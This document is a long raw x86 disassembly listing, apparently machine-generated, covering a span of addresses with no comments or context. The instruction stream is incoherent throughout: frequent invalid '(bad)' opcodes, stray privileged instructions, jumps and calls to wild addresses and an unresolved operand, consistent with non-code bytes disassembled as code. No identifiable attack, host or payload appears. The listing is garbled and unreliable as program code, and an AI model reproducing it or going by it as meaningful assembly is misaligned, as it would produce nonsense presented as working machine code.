  4103cb:	clc    
  4103cc:	(bad)  
  4103cd:	cmp    edi,DWORD PTR [ebx]
  4103cf:	je     0x4103e0
  4103d1:	push   ebx
  4103d2:	loopne 0x4103e3
  4103d4:	dec    ecx
  4103d6:	mov    esp,DWORD PTR [ebp-0x1c]
  4103d9:	int    0xf1
  4103db:	mov    esi,0x703084d
  4103e0:	pcmpgtd mm6,mm1
  4103e3:	add    BYTE PTR [ebp+0x66],dh
  4103e6:	jmp    0x4103b3
  4103e8:	mov    eax,DWORD PTR [ebx]
  4103ea:	lock push ebp
  4103ec:	ror    DWORD PTR [ebp-0x2972feb3],1
  4103f2:	or     bh,dl
  4103f4:	jb     0x4103f4
  4103f6:	add    BYTE PTR [ebx-0x1a7487b3],cl
  4103fc:	loopne 0x4103fe
  4103fe:	jne    0x410402
  410400:	data16 add BYTE PTR [esi+eiz*2],dh
  410404:	mov    ecx,ebx
  410406:	data16 cmp al,0xf1
  410409:	add    BYTE PTR [esi+eiz*2],bh
  41040c:	add    bl,cl
  41040e:	retw   0xf2
  410412:	ret    0x66
  410415:	retf   
  410416:	enterw 0x4df1,0x19
  41041b:	pop    edi
  41041c:	jne    0x41039f
  41041e:	mov    esi,DWORD PTR [eax]
  410420:	call   0x77b58fc1
  410425:	xor    ebp,DWORD PTR [ebx]
  410427:	lea    esp,[esi+0x48]
  41042a:	repnz in eax,0x3b
  41042d:	add    BYTE PTR [ebp-0x37],dh
  410430:	xor    edx,DWORD PTR [ebp-0x15]
  410433:	in     al,dx
  410434:	xor    edx,DWORD PTR [esi+0x40]
  410437:	mov    DWORD PTR [edi],0x338545fc
  41043d:	clc    
  41043e:	add    esi,DWORD PTR [ecx]
  410440:	pop    edi
  410441:	pushf  
  410442:	pop    ebx
  410443:	call   0xff42040a
  410448:	mov    edi,eax
  41044a:	push   ecx
  41044b:	pop    es
  41044c:	mov    edi,DWORD PTR [eax]
  41044e:	push   esi
  41044f:	inc    esi
  410450:	add    bh,BYTE PTR [esi+0x0]
  410453:	popa   
  410454:	data16 (bad) 
  410456:	into   
  410457:	gs cmp al,0xcd
  41045a:	add    BYTE PTR [ecx+0x7ce0866],bh
  410460:	ret    0x66
  410463:	add    bh,al
  410465:	add    bh,ah
  410467:	add    BYTE PTR [ebp+0x31c3f866],al
  41046d:	cmp    al,0x9c
  41046f:	add    BYTE PTR [esi+0x66],ah
  410472:	into   
  410473:	ret    
  410474:	pop    ebp
  410475:	adc    BYTE PTR [edi+0x0],dl
  410478:	mov    bh,0x66
  41047a:	mov    edi,0xff038dc3
  41047f:	jne    0x4104d5
  410481:	lea    edx,[ecx+0x1]
  410484:	mov    ebx,0xd64ff1
  410489:	sar    DWORD PTR [ebx],1
  41048b:	test   BYTE PTR [ebp+0x36],dh
  41048e:	mov    DWORD PTR [esp+edi*8-0x76],esp
  410492:	push   edi
  410493:	xor    BYTE PTR [ebx],0x38
  410496:	mov    esi,ebx
  410498:	xor    eax,DWORD PTR [eax-0x3c73819a]
  41049e:	ss inc ebp
  4104a0:	fs pop ebx
  4104a2:	mov    ebx,0x9c3b30
  4104a7:	je     0x4104d4
  4104a9:	xor    edi,DWORD PTR [ebx+0x668a33]
  4104af:	mov    WORD PTR [ebx],?
  4104b1:	ss mov ebx,0x8b4e64
  4104b7:	pop    edi
  4104b8:	cmp    ecx,ecx
  4104ba:	jne    0x410511
  4104bc:	mov    ebp,esp
  4104be:	cld    
  4104bf:	push   esi
  4104c0:	pop    ebx
  4104c1:	inc    ebp
  4104c2:	stc    
  4104c3:	xor    BYTE PTR [ebp+0x9bef89c],al
  4104c9:	test   esi,ecx
  4104cb:	clc    
  4104cc:	test   dl,dl
  4104ce:	cmp    bh,bh
  4104d0:	fs pop si
  4104d3:	or     bl,al
  4104d5:	add    cl,BYTE PTR [ebx+0x57665100]
  4104db:	retf   0x3c45
  4104de:	xor    BYTE PTR [eax],al
  4104e0:	pushf  
  4104e1:	mov    si,0x85ca
  4104e5:	ret    0xf8
  4104e8:	pop    ebx
  4104e9:	dec    dx
  4104ec:	mov    edx,DWORD PTR [edi-0x76]
  4104ef:	push   edi
  4104f0:	add    al,0xb7
  4104f2:	xor    al,0xba
  4104f4:	cmp    al,0x8d
  4104f6:	je     0x4104f7
  4104f8:	mov    edx,DWORD PTR [edx+edi*4+0x51]
  4104fc:	lea    edi,[ebx+0x544fff]
  410502:	push   ecx
  410503:	cmp    edx,DWORD PTR [ebx+0x75]
  410506:	mov    ecx,DWORD PTR [ecx+0x723bfcbb]
  41050c:	add    BYTE PTR [ebx],dh
  41050e:	sub    ecx,DWORD PTR [ebx+0x668a33bb]
  410514:	add    BYTE PTR [ebx+esi*1+0x4f64bb36],cl
  41051b:	mov    ebx,0x3b3b00
  410520:	jne    0x41054d
  410522:	mov    DWORD PTR [ebx+0x728afc],edi
  410528:	xor    esi,DWORD PTR [ebx]
  41052a:	mov    edi,DWORD PTR [ebx+0x8d4e33]
  410530:	push   edi
  410531:	cmp    esp,ebp
  410533:	jne    0x410535
  410535:	sbb    DWORD PTR [eax],0x8085c3fc
  41053b:	clc    
  41053c:	inc    esi
  41053d:	pop    ebx
  41053e:	sti    
  41053f:	add    eax,0xeb8bc075
  410544:	cld    
  410545:	xor    edi,DWORD PTR ds:0xf8c3855e
  41054b:	mov    ecx,DWORD PTR [ecx+edx*2]
  41054e:	rol    DWORD PTR [ebp-0x37],0xf
  410552:	mov    DWORD PTR [eax],ecx
  410554:	inc    edi
  410555:	(bad)  
  410556:	in     eax,0xfe
  410558:	add    bh,bh
  41055a:	(bad)  
  41055b:	mov    esi,0xc38a5e
  410560:	mov    esi,DWORD PTR [ebx]
  410562:	push   ecx
  410563:	mov    edi,0xfc4ec7
  410568:	test   DWORD PTR [ebp-0x8],edx
  41056b:	xor    di,ax
  41056e:	pushf  
  41056f:	sub    ebp,eax
  410571:	inc    ebp
  410572:	(bad)  
  410573:	sub    edi,edi
  410575:	mov    DWORD PTR [ebx+0x3b03ba08],ecx
  41057b:	inc    ebp
  41057c:	add    BYTE PTR [esi+0x2b],ah
  41057f:	or     bh,BYTE PTR [edx+0xf8ac2]
  410585:	cmp    al,0x33
  410587:	mov    edi,DWORD PTR [edx+0xfe4e81]
  41058d:	(bad)  
  41058e:	cmp    esi,DWORD PTR [ebx]
  410590:	je     0x41054a
  410592:	push   ebx
  410593:	dec    esi
  410594:	str    ecx
  410597:	cmp    esp,DWORD PTR [ebp+0x75]
  41059a:	int    0x33
  41059c:	mov    edi,0x789085f
  4105a1:	mov    edx,DWORD PTR [eax]
  4105a3:	cld    
  4105a4:	add    cl,cl
  4105a6:	data16 add al,0xcb
  4105a9:	push   ebp
  4105aa:	add    ebp,esp
  4105ac:	jne    0x41059a
  4105ae:	(bad)  
  4105af:	mov    DWORD PTR [ecx],0xd685f7ec
  4105b5:	clc    
  4105b6:	xlat   BYTE PTR ds:[ebx]
  4105b7:	inc    ebp
  4105b8:	mov    esi,DWORD PTR [edx]
  4105ba:	push   eax
  4105bb:	pushf  
  4105bc:	in     eax,0x8b
  4105be:	add    ah,ch
  4105c0:	add    dl,BYTE PTR [eax+eax*1+0x51]
  4105c4:	add    ax,0x72cb
  4105c8:	cmp    al,0x0
  4105ca:	add    BYTE PTR [ebp+0x66],al
  4105cd:	(bad)  
  4105ce:	retf   
  4105cf:	lock ret 0x85
  4105d3:	clc    
  4105d4:	inc    bp
  4105d6:	retf   
  4105d7:	cmp    eax,0xc77d9cc8
  4105dc:	xor    ah,bh
  4105de:	pushf  
  4105df:	test   DWORD PTR [edi-0x8],ebx
  4105e2:	je     0x410629
  4105e4:	xor    esi,DWORD PTR ds:0x7020840
  4105ea:	ror    BYTE PTR [ebp-0x37],0x8d
  4105ee:	push   ebp
  4105ef:	add    esp,ebp
  4105f1:	jb     0x41057e
  4105f3:	add    BYTE PTR [eax],cl
  4105f5:	dec    ebp
  4105f6:	mov    bh,0x81
  4105f8:	push   esi
  4105f9:	push   esp
  4105fa:	adc    DWORD PTR [ecx-0x3c],0x3c9bff81
  410601:	xor    al,BYTE PTR [eax]
  410603:	mov    edx,DWORD PTR [edi+0x10]
  410606:	(bad)  
  410607:	scas   eax,DWORD PTR es:[edi]
  410608:	ret    0x3b
  41060b:	jns    0x3b4202fe
  410611:	mov    esi,DWORD PTR [eax+edx*1-0x75]
  410615:	dec    ebp
  410616:	or     BYTE PTR [ebx],ch
  410618:	ret    0x458b
  41061b:	lock jmp 0x41060f
  41061e:	mov    ecx,DWORD PTR [eax]
  410620:	or     BYTE PTR [edi],al
  410622:	mov    ecx,eax
  410624:	xor    DWORD PTR [edx+0x2],0x0
  410628:	mov    bh,0xc1
  41062a:	adc    BYTE PTR [eax],dh
  41062c:	iret   
  41062d:	inc    ebp
  41062e:	mov    DWORD PTR [ebx],0x4dfff8c4
  410634:	inc    BYTE PTR [ebx]
  410636:	ret    0xf8
  410639:	adc    DWORD PTR [esi+0x10],esp
  41063c:	clc    
  41063d:	dec    ecx
  41063e:	fisttp WORD PTR [ecx+0x456604c0]
  410644:	add    dh,BYTE PTR ds:0x75e0845
  41064a:	ret    0x4d
  41064d:	lea    ecx,[ebx+0x18728301]
  410653:	add    BYTE PTR [ebp+0x45],al
  410656:	xor    ecx,ebp
  410658:	pushf  
  410659:	add    bh,al
  41065b:	add    al,ch
  41065d:	inc    ebp
  41065e:	test   DWORD PTR [ebx-0x3eba0708],ecx
  410664:	xor    eax,0x781084d
  410669:	push   esp
  41066a:	fwait
  41066b:	push   ecx
  41066c:	xor    al,BYTE PTR [ecx+0x32f89b89]
  410672:	inc    ebp
  410673:	cmp    edi,DWORD PTR [ecx]
  410675:	jbe    0x410613
  410677:	mov    eax,edi
  410679:	or     ah,dh
  41067b:	inc    ebp
  41067c:	test   DWORD PTR [ebx+0x4d450cf8],ecx
  410682:	xor    ecx,DWORD PTR [ebx-0x74747664]
  410688:	in     al,dx
  410689:	hlt    
  41068a:	push   esp
  41068b:	push   esp
  41068c:	push   ecx
  41068d:	push   ecx
  41068e:	mov    ecx,DWORD PTR [ebx-0x7b7b0708]
  410694:	fwait
  410695:	fwait
  410696:	xor    dh,BYTE PTR [edx]
  410698:	mov    ecx,DWORD PTR [ecx+0x5bf1f8e8]
  41069e:	or     BYTE PTR [ebp+0x7],al
  4106a1:	mov    eax,ecx
  4106a3:	clc    
  4106a4:	jb     0x410667
  4106a6:	add    BYTE PTR [ebp+0x55],cl
  4106a9:	or     DWORD PTR [edi],0xc251d154
  4106af:	add    DWORD PTR [ebx+0x32009b],0x8b76453b
  4106b9:	mov    edi,eax
  4106bb:	or     cl,al
  4106bd:	inc    ebp
  4106be:	dec    ebp
  4106bf:	mov    eax,DWORD PTR [ecx+0x514d540c]
  4106c5:	or     WORD PTR [ecx],0x899b
  4106ca:	xor    cl,BYTE PTR [ebx+0x5476fc3b]
  4106d0:	mov    edx,DWORD PTR [ecx+0x8]
  4106d3:	mov    eax,DWORD PTR [ebp-0x8]
  4106d6:	mov    eax,DWORD PTR [esp+ecx*1-0x74cdb265]
  4106dd:	mov    DWORD PTR [ecx+0x4178bf8],ecx
  4106e3:	inc    ebp
  4106e4:	dec    eax
  4106e5:	add    ecx,DWORD PTR [ebx+0x544df0f8]
  4106eb:	add    edx,DWORD PTR [ecx-0x8]
  4106ee:	mov    ecx,DWORD PTR [ecx]
  4106f0:	clc    
  4106f1:	or     BYTE PTR [ebp+eax*2+0x4532409b],al
  4106f8:	mov    ecx,ebp
  4106fa:	clc    
  4106fb:	(bad)  
  4106fc:	popf   
  4106fd:	inc    DWORD PTR [eax]
  4106ff:	ret    0x8b
  410702:	adc    BYTE PTR [ebx-0x38d4aeb3],cl
  410708:	mov    edi,esp
  41070a:	hlt    
  41070b:	test   ecx,esi
  41070d:	clc    
  41070e:	or     BYTE PTR [ebp+0x7],al
  410711:	xor    al,cl
  410713:	pushf  
  410714:	jb     0x410749
  410716:	add    BYTE PTR [eax-0x3f],al
  410719:	inc    eax
  41071a:	daa    
  41071b:	inc    ebp
  41071c:	inc    ebp
  41071d:	xor    eax,0x7f80803
  410722:	dec    ebp
  410723:	fwait
  410724:	add    esi,DWORD PTR [edx]
  410726:	clc    
  410727:	cmp    DWORD PTR [ecx],ecx
  410729:	or     al,0x8
  41072b:	add    al,BYTE PTR [ebp+0x2c]
  41072e:	xor    eax,0x7350845
  410733:	or     BYTE PTR [ebp+0x7],cl
  410736:	lea    ebx,[ebx-0x748dcdff]
  41073c:	add    BYTE PTR [eax*2-0x74b21438],cl
  410743:	mov    edx,DWORD PTR [eax]
  410745:	cld    
  410746:	dec    ebp
  410747:	push   esp
  410748:	sub    edx,DWORD PTR [ecx-0x75]
  41074b:	add    eax,0xf172fc
  410750:	or     BYTE PTR [ebp+0x7],cl
  410753:	add    eax,ecx
  410755:	or     al,0x72
  410757:	add    DWORD PTR [eax],eax
  410759:	mov    ebx,0x29c2c1
  41075e:	inc    ebp
  41075f:	mov    eax,DWORD PTR [ebx]
  410761:	cmp    eax,0x3004d1c
  410767:	xbegin 0x66c69361
  41076d:	clc    
  41076e:	or     BYTE PTR [ebp+0x45],al
  410771:	xor    dh,BYTE PTR ds:0x78b089c
  410777:	adc    BYTE PTR [ebp+0x45],cl
  41077a:	lea    eax,[ebp+0x33727501]
  410780:	add    cl,ch
  410782:	inc    ebp
  410783:	add    bl,ch
  410785:	add    BYTE PTR [ebx+0x45850845],cl
  41078b:	je     0x410718
  41078d:	push   ebx
  41078e:	or     al,0x85
  410790:	dec    ebp
  410791:	std    
  410792:	mov    bh,bh
  410794:	mov    BYTE PTR [ebp-0x75],al
  410797:	mov    edi,eax
  410799:	or     al,0x89
  41079b:	inc    ebp
  41079c:	clc    
  41079d:	mov    esp,esp
  41079f:	hlt    
  4107a0:	call   DWORD PTR [edi-0x37]
  4107a3:	push   esp
  4107a4:	or     al,0x51
  4107a6:	push   ebp
  4107a7:	xor    ebp,esp
  4107a9:	mov    esi,0x457251
  4107ae:	xor    esi,eax
  4107b0:	pushf  
  4107b1:	inc    ebp
  4107b2:	(bad)  
  4107b3:	mov    edi,eax
  4107b5:	or     al,0x85
  4107b7:	add    al,bh
  4107b9:	inc    eax
  4107bb:	mov    esi,DWORD PTR [ebx+ecx*4-0x75]
  4107bf:	or     ah,bh
  4107c1:	inc    eax
  4107c2:	push   esp
  4107c3:	jmp    0x410816
  4107c5:	mov    eax,DWORD PTR ds:0xe8720c
  4107cb:	mov    DWORD PTR [ebp-0x8],eax
  4107ce:	jne    0x410815
  4107d0:	jmp    0x41075d
  4107d2:	mov    ebp,DWORD PTR [eax]
  4107d4:	clc    
  4107d5:	retf   0xff54
  4107d8:	push   ecx
  4107d9:	mov    DWORD PTR ds:0x757210,eax
  4107df:	mov    ecx,DWORD PTR [ebp-0x4]
  4107e2:	sub    esp,DWORD PTR [ebx-0x77]
  4107e5:	dec    DWORD PTR [eax*4-0x74ca8abb]
  4107ec:	or     ah,bh
  4107ee:	pop    es
  4107ef:	ds fwait
  4107f1:	push   DWORD PTR [edx]
  4107f3:	mov    ecx,DWORD PTR [ebx+0x4dc708f0]
  4107f9:	(bad)  
  4107fa:	mov    bh,bh
  4107fc:	jmp    0x4107ea
  4107fe:	leave  
  4107ff:	jne    0x410809
  410801:	call   0x2e015b
  410806:	in     al,dx
  410807:	dec    ebp
  410808:	add    dh,BYTE PTR [ebx]
  41080a:	add    BYTE PTR [ebx],al
  41080c:	inc    ebp
  41080d:	cmp    esi,DWORD PTR [ecx]
  41080f:	je     0x4107ad
  410811:	mov    eax,edi
  410813:	or     al,0xf0
  410815:	add    BYTE PTR [ebp+0x458bf845],al
  41081b:	or     BYTE PTR [ebx-0x3f7cf7b3],cl
  410821:	adc    al,0x7
  410823:	enter  0x9fc0,0xa5
  410827:	rol    BYTE PTR [eax],0x5e
  41082a:	mov    ecx,ecx
  41082c:	or     al,0xc
  41082e:	ror    BYTE PTR [ebx+0x408df8f2],0xe4
  410835:	jmp    0x410836
  410837:	push   ebp
  410838:	mov    esp,ebp
  41083a:	cld    
  41083b:	inc    ebp
  41083c:	inc    ebp
  41083d:	or     DWORD PTR [ecx+0x457dec10],0x0
  410844:	push   esi
  410845:	push   esi
  410846:	mov    edi,0x7af080f
  41084b:	add    bh,al
  41084d:	test   DWORD PTR [ebx+0x3a7320f],ebx
  410853:	add    BYTE PTR [ecx+0x4540100f],cl
  410859:	mov    ebp,eax
  41085b:	mov    ebp,edi
  41085d:	lock call edx
  410860:	fcom   DWORD PTR [ebp+0x45]
  410863:	mov    eax,0x148a8b
  410868:	push   ecx
  410869:	enter  0xc145,0x83
  41086d:	cmp    ecx,DWORD PTR [eax]
  41086f:	add    BYTE PTR [ebp+0x4d],al
  410872:	mov    eax,DWORD PTR [ebx+0x3340fcf8]
  410878:	call   0xffa103e7
  41087d:	cmp    eax,DWORD PTR [ebp-0xc]
  410880:	jmp    DWORD PTR [eax+edx*1-0x4e]
  410884:	push   ebp
  410885:	(bad)  
  410886:	call   0x32068a
  41088b:	mov    bh,0xdb
  41088d:	cld    
  41088e:	or     BYTE PTR [ebp+0x45],bl
  410891:	(bad)  
  410892:	call   0xff7b0522
  410897:	add    al,BYTE PTR [ebp+0x37]
  41089a:	xor    esi,DWORD PTR [edi+0x4e50bf03]
  4108a0:	jne    0x4108a2
  4108a2:	(bad)  
  4108a3:	cmp    edi,esp
  4108a5:	jne    0x4108d8
  4108a7:	mov    edi,edi
  4108a9:	or     BYTE PTR [ebx-0x307f0b49],cl
  4108af:	pop    ds
  4108b0:	into   
  4108b1:	je     0x410874
  4108b3:	mov    ebx,DWORD PTR [esi]
  4108b5:	or     BYTE PTR [ebp-0x49],al
  4108b8:	mov    esp,DWORD PTR [esi-0x77]
  4108bb:	mov    esi,0x2451f0c
  4108c0:	mov    eax,DWORD PTR [eax]
  4108c2:	or     al,0x66
  4108c4:	sar    bl,0x3b
  4108c7:	xor    esi,DWORD PTR [ebp+0x66]
  4108ca:	xor    ecx,edi
  4108cc:	pop    edi
  4108cd:	adc    bl,BYTE PTR [ebx+0x7e]
  4108d0:	ret    0xff
  4108d3:	cld    
  4108d4:	inc    ebp
  4108d5:	mov    ecx,DWORD PTR [ebx-0xec6e70c]
  4108db:	cld    
  4108dc:	mov    ebp,DWORD PTR [ebx+ecx*4-0x13baf3fa]
  4108e3:	push   0xffffff83
  4108e5:	pop    edi
  4108e6:	or     BYTE PTR [ebp+0x53],dh
  4108e9:	xorps  xmm1,xmm2
  4108ec:	test   BYTE PTR [eax+eax*1],bh
  4108ef:	add    BYTE PTR [eax],al
  4108f1:	adc    eax,eax
  4108f3:	add    DWORD PTR [esi+edi*2-0xff7b00],0xffffffb7
  4108fb:	jmp    DWORD PTR [eax]
  4108fd:	ror    al,0x5e
  410900:	inc    ebp
  410901:	leave  
  410902:	xor    ecx,DWORD PTR [eax]
  410904:	and    DWORD PTR [ebx-0x3ec30708],ecx
  41090a:	add    ah,al
  41090c:	xor    edi,edi
  41090e:	xor    DWORD PTR [ebx],0x66003302
  410914:	mov    DWORD PTR [ebp-0xc],ecx
  410917:	pcmpgtw mm0,mm0
  41091a:	add    dl,ah
  41091c:	leave  
  41091d:	mov    edi,DWORD PTR [ebx+eax*4+0x66]
  410921:	push   eax
  410922:	dec    ebp
  410923:	mov    esi,DWORD PTR [ebx-0x75]
  410926:	lea    ebp,[eax-0x7c00ff02]
  41092c:	xor    eax,DWORD PTR [eax]
  41092e:	sysret 
  410930:	dec    ebp
  410931:	ror    BYTE PTR [ebx+0xc000c30],0x6a
  410938:	push   WORD PTR [ecx+0x8]
  41093c:	jne    0x4108ff
  41093e:	ud0    ecx,DWORD PTR [ecx]
  410941:	mov    eax,edx
  410943:	lods   al,BYTE PTR ds:[esi]
  410944:	add    BYTE PTR [eax],al
  410946:	data16 (bad) 
  410948:	iret   
  410949:	and    cl,BYTE PTR [eax*2+0x440f8d5d]
  410950:	cli    
  410951:	inc    ebp
  410952:	cmp    al,0x8d
  410954:	add    BYTE PTR [esi+0x2d],ah
  410957:	inc    ebp
  410958:	pop    ebp
  410959:	lea    ecx,[edi]
  41095b:	mov    dl,bh
  41095d:	add    BYTE PTR [edi],cl
  41095f:	mov    DWORD PTR [eax+eax*8],edi
  410962:	mov    ebx,0x3b87
  410967:	add    BYTE PTR [ebx],ch
  410969:	inc    ebp
  41096a:	data16 (bad) 
  41096c:	clc    
  41096d:	int3   
  41096e:	cmp    eax,DWORD PTR [eax]
  410970:	je     0x4108fb
  410972:	push   0xffffffc8
  410974:	pop    edi
  410975:	xchg   DWORD PTR [ebp+0x0],eax
  410978:	data16 add BYTE PTR [ebp+0x45],cl
  41097c:	lea    cx,[ebp+0x10]
  410980:	jb     0x410982
  410982:	jmp    0x41090d
  410984:	call   eax
  410986:	clc    
  410987:	xchg   DWORD PTR [edi+0x1],edi
  41098a:	mov    eax,DWORD PTR [eax]
  41098c:	or     BYTE PTR [ebp-0x49],al
  41098f:	lea    eax,[eax+0x74003154]
  410995:	push   edi
  410996:	inc    edx
  410997:	jge    0x410998
  410999:	mov    DWORD PTR [edi],ecx
  41099b:	fdiv   DWORD PTR [edi-0x6]
  41099e:	inc    DWORD PTR [eax]
  4109a0:	xor    edx,DWORD PTR [eax+0x5f]
  4109a3:	xchg   DWORD PTR [ebx+0x1],ebx
  4109a6:	ret    0x0
  4109a9:	xor    BYTE PTR [ebp-0x51],cl
  4109ac:	cmp    edi,0xf0ff89fe
  4109b2:	data16 ror al,0x84
  4109b6:	rol    BYTE PTR [eax],0x3b
  4109b9:	add    al,dh
  4109bb:	dec    eax
  4109bc:	xchg   esp,eax
  4109bd:	push   ebx
  4109be:	jmp    0x41094b
  4109c0:	push   ebp
  4109c1:	add    esp,ebp
  4109c3:	add    ebp,esp
  4109c5:	mov    edx,DWORD PTR [edi+0x24]
  4109c8:	clc    
  4109c9:	dec    esi
  4109ca:	xchg   DWORD PTR [ebx+0x5e002001],ecx
  4109d0:	cmp    BYTE PTR [ebx],al
  4109d2:	jne    0x41095d
  4109d4:	xor    esp,eax
  4109d6:	jmp    0x440b59
  4109db:	add    ebp,DWORD PTR [ecx+ecx*4]
  4109de:	jne    0x4109d4
  4109e0:	call   0xffcb073a
  4109e5:	clc    
  4109e6:	xchg   edi,eax
  4109e7:	sti    
  4109e8:	add    DWORD PTR [ebx],eax
  4109ea:	add    BYTE PTR [ebp+0x47],bl
  4109ed:	xor    ecx,DWORD PTR [ecx+0x47e8b489]
  4109f3:	pop    ebp
  4109f4:	mov    DWORD PTR [esi-0x48],esi
  4109f7:	jmp    0x410a40
  4109f9:	mov    ecx,DWORD PTR [ecx-0x7882431c]
  4109ff:	(bad)  
  410a01:	cmp    al,0x0
  410a03:	cmp    eax,DWORD PTR [ebp+0x18]
  410a06:	lea    ebx,[ebp-0x56]
  410a09:	jle    0x410a0b
  410a0b:	jae    0x410996
  410a0d:	mov    eax,esp
  410a0f:	call   0xb900:0x8b005587
  410a16:	inc    ebp
  410a17:	push   ebp
  410a18:	lea    ecx,[ebp-0x27ff4f12]
  410a1e:	mov    eax,edi
  410a20:	int3   
  410a21:	push   ebp
  410a22:	xchg   edi,eax
  410a24:	add    esp,ebp
  410a26:	add    BYTE PTR [eax],al
  410a28:	inc    ebp
  410a29:	add    BYTE PTR [ebp+0x8b3255],cl
  410a2f:	cld    
  410a30:	mov    DWORD PTR [edx],edi
  410a32:	aam    0x75
  410a34:	xchg   DWORD PTR [ebx+0x3400dc01],ecx
  410a3a:	mov    DWORD PTR [ebx-0x50],edx
  410a3d:	test   BYTE PTR [ebp-0x1],0xe8
  410a41:	mov    eax,DWORD PTR [eax]
  410a43:	hlt    
  410a44:	add    al,al
  410a46:	mov    eax,DWORD PTR ds:0x890045a8
  410a4c:	dec    DWORD PTR [ebx+0x45fdf0e8]
  410a52:	inc    DWORD PTR [eax*2+0xf75854d]
  410a59:	mov    ebp,DWORD PTR [ebp-0x7476ff18]
  410a5f:	call   0x729767a0
  410a64:	je     0x410ac4
  410a66:	js     0x410ac7
  410a68:	lock ret 0x7e
  410a6c:	mov    ecx,DWORD PTR [ebx+0x8568b1c]
  410a72:	mov    edi,edi
  410a74:	sbb    al,bl
  410a76:	clc    
  410a77:	add    BYTE PTR [ebp-0x73],bh
  410a7a:	mov    ebx,DWORD PTR [eax-0x7437ffec]
  410a80:	ror    BYTE PTR [eax],1
  410a82:	dec    ebp
  410a83:	xchg   ebp,eax
  410a84:	mov    edi,edi
  410a86:	in     al,0x8b
  410a88:	jge    0x410a13
  410a8a:	cmp    ecx,DWORD PTR [ebx+0x39893377]
  410a90:	clc    
  410a91:	pop    esi
  410a92:	fist   DWORD PTR [ebp+0x5d398b5d]
  410a98:	clc    
  410a99:	add    al,0x6e
  410a9b:	mov    eax,DWORD PTR [ebx]
  410a9d:	mov    BYTE PTR [ebp+0x0],dl
  410aa0:	mov    edx,DWORD PTR [ebx-0x20]
  410aa3:	adc    esi,DWORD PTR [edi+0x5e005f3c]
  410aa9:	add    eax,0x3b3b73
  410aae:	adc    al,0x89
  410ab0:	pop    eax
  410ab1:	sbb    DWORD PTR [edx+eax*1],0xffffff8b
  410ab5:	ret    0xf08
  410ab8:	cmp    al,0x2
  410aba:	mov    edx,eax
  410abc:	cld    
  410abd:	add    BYTE PTR [ebp+0x66],dl
  410ac0:	add    eax,ebx
  410ac2:	add    esp,eax
  410ac4:	sub    eax,eax
  410ac6:	or     BYTE PTR [ecx-0x77f474bb],cl
  410acc:	add    BYTE PTR [eax],al
  410ace:	mov    DWORD PTR [ebx-0x24],ebx
  410ad1:	push   edi
  410ad2:	push   ebp
  410ad3:	clc    
  410ad4:	add    DWORD PTR [esi+0x1b0100],0x45
  410adb:	out    0xff,eax
  410add:	add    edx,DWORD PTR [eax]
  410adf:	jmp    0x410ac9
  410ae1:	cmp    ch,0x46
  410ae4:	(bad)  
  410ae5:	jmp    0x40c69337
  410aea:	je     0x410a76
  410aec:	mov    eax,DWORD PTR [eax-0x10c78104]
  410af2:	inc    ebp
  410af3:	add    BYTE PTR [ebx-0x770375],al
  410af9:	add    ah,ch
  410afb:	add    edx,esp
  410afd:	pop    edi
  410afe:	pop    ebp
  410aff:	push   ebp
  410b00:	inc    ebx
  410b01:	in     al,dx
  410b02:	pop    ebp
  410b03:	in     al,dx
  410b04:	cmp    edx,DWORD PTR [edi-0x8]
  410b07:	xor    DWORD PTR [esp+ebx*4-0x173676a5],edx
  410b0e:	add    al,0x47
  410b10:	push   ebp
  410b11:	mov    esp,ebp
  410b13:	in     al,0x45
  410b15:	dec    ebp
  410b16:	push   esi
  410b17:	test   DWORD PTR [eax+0xfb010f],esi
  410b1d:	add    BYTE PTR [eax+0xc018b],dh
  410b23:	leave  
  410b24:	inc    ebp
  410b25:	test   al,ch
  410b27:	add    dh,bh
  410b29:	add    bh,bh
  410b2b:	dec    ebp
  410b2c:	push   cs
  410b2d:	mov    DWORD PTR [ecx],eax
  410b2f:	hlt    
  410b30:	push   es
  410b31:	dec    ebp
  410b32:	leave  
  410b33:	mov    DWORD PTR [eax],ecx
  410b35:	clc    
  410b36:	cmovge eax,ecx
  410b39:	mov    ecx,0x85c2f0
  410b3f:	clc    
  410b40:	pop    DWORD PTR [ebp+0x1]
  410b43:	push   ebx
  410b44:	add    BYTE PTR [ebp-0x15],bh
  410b47:	push   esi
  410b48:	xor    eax,0x898a45
  410b4d:	cld    
  410b4e:	add    al,BYTE PTR [ebp+0x0]
  410b51:	xor    esp,DWORD PTR [esi-0x64]
  410b54:	add    DWORD PTR [esi+0x78308c1],edi
  410b5a:	add    ah,BYTE PTR [ebp-0x49]
  410b5d:	int    0xbb
  410b5f:	mov    ecx,DWORD PTR [esi+0xc]
  410b62:	add    dh,al
  410b64:	cmp    ecx,ebx
  410b66:	jne    0x410b30
  410b68:	xor    ecx,DWORD PTR [ebp+0x66]
  410b6b:	jmp    0xc80b71
  410b70:	add    DWORD PTR [ebp+0x0],eax
  410b73:	mov    eax,ebx
  410b75:	or     al,0x8b
  410b77:	(bad)  
  410b78:	mov    ecx,esi
  410b7a:	mov    BYTE PTR [eax+eax*1+0x664c136],cl
  410b81:	mov    eax,edi
  410b83:	or     BYTE PTR [edx],cl
  410b85:	shl    cl,cl
  410b87:	icebp  
  410b88:	add    BYTE PTR [ebp+0x38],0x8b
  410b8c:	or     BYTE PTR [edx+eax*2],cl
  410b8f:	(bad)  
  410b90:	or     cl,dh
  410b92:	stc    
  410b93:	shl    DWORD PTR [ebp-0x30],0xc6
  410b97:	xor    al,0x0
  410b99:	inc    ebp
  410b9a:	xchg   BYTE PTR [ebx],al
  410b9c:	add    esp,edi
  410b9e:	add    BYTE PTR [ebp-0x39],cl
  410ba1:	mov    al,bl
  410ba3:	test   DWORD PTR [ebx+0x1c348375],ecx
  410ba9:	sub    al,0xbf
  410bab:	jmp    0x410b32
  410bad:	mov    edi,eax
  410baf:	lock jge 0x410ba3
  410bb2:	lea    esi,[edx-0x74bad5ff]
  410bb8:	mov    ebp,esp
  410bba:	or     cl,dh
  410bbc:	leave  
  410bbd:	add    al,BYTE PTR [eax+eax*4-0x37ff9b00]
  410bc4:	dec    ebp
  410bc5:	dec    ebp
  410bc6:	test   DWORD PTR [ebx],eax
  410bc8:	paddb  mm6,mm0
  410bcb:	add    DWORD PTR [eax],eax
  410bcd:	dec    ebp
  410bce:	mov    ecx,DWORD PTR [ebx-0x64b217f0]
  410bd4:	mov    esi,DWORD PTR [edx]
  410bd6:	or     al,0x2b
  410bd8:	dec    ebp
  410bd9:	xor    ecx,DWORD PTR [ebx+0x4575083b]
  410bdf:	mov    esp,edi
  410be1:	adc    BYTE PTR [ebp+edx*2+0x33ec3389],bl
  410be8:	mov    DWORD PTR [ebx],ebp
